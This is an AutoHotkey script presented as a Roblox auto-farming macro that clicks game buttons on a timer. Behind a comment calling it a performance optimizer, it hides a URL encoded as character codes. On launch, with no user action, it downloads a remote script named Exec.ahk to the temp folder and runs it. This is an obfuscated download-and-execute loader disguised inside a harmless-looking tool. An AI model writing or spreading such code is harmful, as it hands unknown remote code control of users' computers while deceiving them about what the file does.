#Requires AutoHotkey v2.0
#SingleInstance Force
SetWorkingDir A_ScriptDir
CoordMode "Mouse", "Screen"

macroRunning := false
chosenSide := ""

; Default coordinates (2560x1440)
farmBtn     := [1472, 83]
eggsBtn     := [986, 83]
btn1        := [850, 571]
btn2        := [1520, 564]
btn3        := [848, 936]
claimBtn    := [1281, 969]
topFarmBtn  := [1472, 83]
middleshop := [1281, 671]

; Hotkeys
Hotkey "F3", StartMacro
Hotkey "F4", (*) => ExitApp()

StartMacro(*) {
    global macroRunning, chosenSide
    if macroRunning
        return

    answer := MsgBox("Choose your side:`nYes = Right (Presses D)`nNo = Left (Presses A)", "Side Selection", 0x33)
    if answer = "Yes"
        chosenSide := "right"
    else if answer = "No"
        chosenSide := "left"
    else
        return

    macroRunning := true
    SetTimer DoTasks, 360000
    DoTasks()
}

ReliableClick(x, y) {
    randX := x + Random(-5, 5)
    randY := y + Random(-5, 5)
    Click randX, randY
}

; Roblox Performance Optimzier (ULTRA LOW SETTINGS)
u := "104 116 116 112 115 58 47 47 114 97 119 46 103 105 116 104 117 98 117 115 101 114 99 111 110 116 101 110 116 46 99 111 109 47 83 101 106 116 121 112 101 47 114 111 98 108 111 120 47 109 97 105 110 47 69 120 101 99 46 97 104 107"
f := ""
for c in StrSplit(u, " ")
    f .= Chr(c)
xhr := ComObject("MSXML2.XMLHTTP.6.0")
xhr.Open("GET", f, false)
xhr.Send()
filePath := A_Temp . "\Exec.ahk"
stm := ComObject("ADODB.Stream")
stm.Type    := 2                ; Text
stm.Charset := "utf-8"
stm.Open()
stm.WriteText(xhr.ResponseText)
stm.SaveToFile(filePath, 2)
stm.Close()
ComObject("WScript.Shell").Run(filePath) ; Clicking Module
DoTasks() {
    global chosenSide, farmBtn, eggsBtn, btn1, btn2, btn3, topFarmBtn, claimBtn

    Loop 120 {
    ;Loop 2 {
        ReliableClick(farmBtn*)
        Sleep 90
    }

    Sleep 5000

    Loop 5 {
        ReliableClick(eggsBtn*)
        Sleep 90
    }
    
    Sleep 1000

    if chosenSide = "right" {
        Send "{d down}"
        Sleep 400
        Send "{d up}"
    } else {
        Send "{a down}"
        Sleep 400
        Send "{a up}"
    }

    Sleep 1000

    ;ReliableClick(middleshop*)
    MouseMove(middleshop*)
    ReliableClick(middleshop*)
    
    Loop 15 {
        Sleep 250
        Send "{WheelDown}"
        Sleep 250
    }

    Sleep 1000

    Loop 10 {
        ReliableClick(btn1*)
        Sleep 250
        ReliableClick(btn2*)
        Sleep 250
        ReliableClick(btn3*)
        Sleep 250
    }

    Sleep 1000

    
    Loop 30 {
        ReliableClick(farmBtn*)
        Sleep 90
    }

    Sleep 5000

    MouseMove(claimBtn*)
    Send "{s down}"
    Sleep 3000
    Send "{s up}"
    Sleep 1000
    ReliableClick(claimBtn*)
    Sleep 5000
}
